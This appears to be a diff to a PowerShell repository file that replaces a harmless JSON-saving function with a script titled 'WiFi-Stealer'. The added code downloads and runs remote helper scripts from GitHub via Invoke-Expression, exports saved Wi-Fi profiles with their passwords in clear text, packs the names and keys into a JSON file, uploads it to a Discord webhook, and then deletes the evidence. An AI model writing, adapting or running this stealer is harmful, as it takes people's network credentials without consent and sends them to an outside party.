@@ -12,8 +12,9 @@
 #  github.com/unwe4p0n1zed                                                tiktok.com/@unwe4p0n1zed                                                                          #
 #  twitter.com/unwe4p0n1zed                                               youtube.com/@unwe4p0n1zed                                                                         #
 #                                                                                                                                                                           #
-#  Title: Save-JSON                                                                                                                                                         #
-#  Description: This PowerShell code save JSON file with given data.                                                                                                        #
+#  Title: WiFi-Stealer                                                                                                                                                      #
+#  Description: This PowerShell code can steal user Wi-Fi credentials, save it as JSON file and send it over Discord channel using the provided webhook URL.                #
+#  Target: Windows 10, 11                                                                                                                                                   #
 #___________________________________________________________________________________________________________________________________________________________________________#
 #                                             __  __________  _      ______________ __  ________   ___  __________  ____     __                                             #
 #                                            / / / / __/ __/ | | /| / /  _/_  __/ // / / ___/ _ | / _ \/ __/ __/ / / / /    / /                                             #
@@ -21,53 +22,42 @@
 #                                           \____/___/___/   |__/|__/___/ /_/ /_//_/  \___/_/ |_/_/|_/___/_/  \____/____/ (_)                                               #
 #############################################################################################################################################################################
 
-function Save-JSON {
-    param(
-        [CmdletBinding()]
-        [Parameter(Mandatory = $false)]
-        [Alias("p")]
-        [string]$path,
+# get all the scripts needed 
+Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/unwe4p0n1zed/Powershell-Scripts/main/Functions/Upload-Discord/Upload-Discord.ps1'))
+Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/unwe4p0n1zed/Powershell-Scripts/main/Functions/Remove-FileOrFolder/Remove-FileOrFolder.ps1'))
 
-        [Parameter(Mandatory = $true)]
-        [Alias("f")]
-        [string]$filename,
+# set discord webhook url
+$webhookUrl = '<SET_DISCORD_URL_HERE>'
+ 
+# randomize directory name
+$dir = -join ((65..90) + (97..122) | Get-Random -Count 14 | % {[char]$_})
 
-        [Parameter(Mandatory = $true)]
-        [Alias("d")]
-        [object]$data,
+# create directory
+New-Item -Path $env:temp -Name $dir -ItemType "directory"
 
-        [Parameter(Mandatory = $false)]
-        [Alias("ibd")]
-        [bool]$includeBaseDirectory = $false
-    )
+# set new directory as current dicrectory
+$fullPath = "$env:temp/$dir"
+Set-Location -Path $fullPath
 
-    # Include base user directory
-    $userDir = Get-Variable HOME -valueOnly
+# export wlan data files to current directory
+netsh wlan export profile key=clear
 
-    if ([string]::IsNullOrEmpty($path)){
-        $path = $pwd
-    }
-    elseif ($includeBaseDirectory) {
-        $path = Join-Path $userDir $path
-    }
+# list all files
+$files = Get-ChildItem ./ -recurse
 
-    # Add .json extension if not provided
-    if (-not $filename.ToLower().Contains(".json")) { 
-        $fileName = $fileName + ".json"
-    }
+# loop over files and grab data
+$data = foreach ($file in $files) { [xml]$xml = Get-Content -Path $file.Name; $xml.WLANProfile.SSIDConfig.SSID | Select-Object -Property name, @{Name="password";Expression={$xml.WLANProfile.MSM.security.sharedKey.keyMaterial}}, @{Name="bssid";Expression={$xml.WLANProfile.SSIDConfig.SSID.hex}}} 
 
-    # Combine the path and filename
-    $fullPath = Join-Path -Path $path -ChildPath $filename
-    
-    # Create the destination path if it does not exist
-    if (-not (Test-Path $fullPath)) {
-        New-Item -ItemType Directory -Path $fullPath | Out-Null
-    }
+# save JSON file with credentials data
+$username = (Get-ChildItem Env:\USERNAME).Value
+$jsonFileName = "WiFi-Credentials-$username.json"
+$data | ConvertTo-Json | Out-File $jsonFileName
+ 
+# send discord message and files
+& Upload-Discord -t "WiFi Credentials - $username" -f $jsonFileName -u $webhookUrl
 
-    # Convert the data to JSON and save it to the file
-    $data | ConvertTo-Json -Depth 100 | Out-File $fullPath
+# remove folder with files
+Set-Location ../
+Remove-FileOrFolder -ip $fullPath -it "Folder" 
 
-    Write-Output "Data saved to '$fullPath'"
-
-    return $fullPath
-}
+EXIT
